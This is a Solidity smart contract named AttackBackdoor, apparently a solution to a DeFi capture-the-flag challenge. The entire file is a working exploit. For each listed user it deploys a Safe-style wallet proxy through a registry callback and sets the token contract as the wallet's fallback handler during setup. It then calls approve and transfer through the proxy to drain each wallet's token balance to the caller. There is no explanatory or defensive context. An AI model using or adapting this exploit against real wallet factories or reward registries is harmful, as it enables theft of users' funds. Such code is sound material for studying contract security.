// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface ISafe {
  function createProxyWithCallback(address, bytes memory, uint256, address) external returns (IERC20);
}


contract AttackBackdoor {

  function attack(address[] calldata users, address token, address registry, address safe, address master) external{

    address[] memory owners = new address[](1);
    IERC20 proxy;

    for (uint i = 0; i < users.length; i++){
      owners[0] = users[i];
      bytes memory setup = abi.encodeWithSignature(
        "setup(address[],uint256,address,bytes,address,address,uint256,address)",
        owners, 1, address(0), "", token, address(0), 0, address(0)
      );
      proxy = ISafe(safe).createProxyWithCallback(
        master,
        setup,
        0,
        registry
      );
      uint256 amount = IERC20(token).balanceOf(address(proxy));
      proxy.approve(msg.sender, amount);
      proxy.transfer(msg.sender, amount);
    }
  }
}
